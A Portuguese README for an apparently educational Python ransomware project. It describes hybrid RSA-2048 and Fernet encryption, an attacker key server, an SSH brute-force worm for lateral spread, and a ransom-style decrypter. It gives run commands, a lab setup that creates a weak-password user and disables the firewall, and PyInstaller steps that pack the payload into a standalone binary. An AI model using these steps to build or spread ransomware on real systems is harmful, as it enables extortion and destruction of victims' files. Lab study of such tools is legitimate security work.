
# Projeto Ransomware Didático (RSA-2048)

Este projeto é uma ferramenta educacional desenvolvida para demonstrar o funcionamento técnico de um ataque de ransomware e a eficácia da criptografia híbrida na prevenção da recuperação de arquivos sem a chave correta.

> [!WARNING]
> **AVISO LEGAL:** Este projeto foi criado estritamente para fins didáticos e educacionais. O uso deste software para atividades maliciosas em sistemas de terceiros sem autorização explícita é ilegal e antiético.

## 🚀 Como Funciona

O projeto utiliza um sistema de **criptografia híbrida**:
1.  **Criptografia Simétrica (AES/Fernet):** Usada para criptografar os arquivos reais de forma rápida.
2.  **Criptografia Assimétrica (RSA-2048):** Usada para proteger a chave simétrica. A chave pública criptografa a chave AES, e apenas a chave privada correspondente pode descriptografá-la.

## 📂 Estrutura do Projeto

* **Atacante**: 
    * `generate_keys.py`: Gera o par de chaves RSA-2048.
    * `server.py`: Servidor que recebe a chave AES criptografada.
* **Vítima**:
    * `ransomware.py`: Script principal de criptografia.
    * `worm.py`: Módulo de propagação lateral via SSH e força bruta.
    * `client.py`: Realiza a conexão com o servidor do atacante.
    * `decrypter.py`: Interface para descriptografar os arquivos após o "pagamento".
## 🛠️ Pré-requisitos

*   Python 3.x
*   Biblioteca `cryptography`
*   Biblioteca `paramiko`

Instale as dependências com:
```bash
pip install cryptography
```
```bash
pip install paramiko
```
ou 
```bash
pip install -r requirements.txt
```

## 📖 Passo a Passo de Uso

### Atacante

1.  **Gerar Chaves:**
    ```bash
    python generate_keys.py
    ```
    Isso criará os arquivos `.pem`. Em um cenário real, a `private_key.pem` nunca sairia da máquina do atacante.

2.  **Iniciar o servidor:**
    ```bash
    python server.py
    ```
    Inicia o servidor para receber as execuções do ransomware.

### Vítima

1.  **Criptografar:**
    ```bash
    python ransomware.py
    ```
    Os arquivos na pasta (ambiente controlado) serão substituídos por versões `.enc` e uma chave protegida `key.bin.enc` será gerada.

2.  **Descriptografar:**
    ```bash
    python decrypter.py
    ```
    Usa a chave enviada pelo atacante após o resgate.
## 🛠️ Laboratório de Teste (3 VMs)

Para testar a funcionalidade de **Worm** (propagação), recomenda-se o uso de três máquinas virtuais em uma **Rede Interna** isolada.

| Máquina | IP Sugerido | Papel |
| :--- | :--- | :--- |
| **Atacante** | `192.168.1.40` | Hospeda o `server.py` e a chave privada. |
| **Vítima 1** | `192.168.1.10` | Ponto inicial da infecção. |
| **Vítima 2** | `192.168.1.11` | Alvo da propagação via SSH. |

### Preparação do Alvo (Vítima 2)
Certifique-se de que o SSH está ativo e com um usuário vulnerável:
```bash
sudo apt install openssh-server unzip
sudo useradd -m -s /bin/bash aluno
echo "aluno:senha123" | sudo chpasswd
sudo ufw disable
```

## 📦 Criação do Executável (Linux)

Transformar o script em um binário permite que ele rode em sistemas sem Python ou bibliotecas instaladas.

### 1. Preparar o Pacote de Propagação
O worm enviará um executável:
```bash
zip -r ex.zip ransomware.py client.py alert_show.py public_key.pem assets/
```

### 2. Compilar com PyInstaller
```bash
pip install pyinstaller cryptography paramiko

pyinstaller --onefile \
            --add-data "public_key.pem:." \
            --add-data "assets/alert_image.png:assets" \
            --add-data "ex.zip:." \
            ransomware.py
```

## 📖 Passo a Passo de Uso

### Atacante
1.  **Gerar Chaves:** `python3 generate_keys.py`.
2.  **Iniciar Servidor:** `python3 server.py --host 192.168.1.40 --port 8000`.

### Vítima
1.  **Criptografia Local:**
    ```bash
    python3 ransomware.py
    ```
2.  **Criptografia + Propagação Worm:**
    ```bash
    python3 ransomware.py --worm
    ```
3.  **Descriptografar:** Use o `decrypter.py` com a chave recuperada no servidor do atacante.

## 🧪 Demonstração de Falha
Para provar que a recuperação é impossível sem a chave original:
1.  Criptografe os arquivos.
2.  Gere novas chaves RSA, substituindo a antiga.
3.  Tente descriptografar. O processo falhará pois a nova chave privada não pode abrir o `key.bin.enc` antigo.

Desenvolvido para fins de estudo sobre segurança da informação.
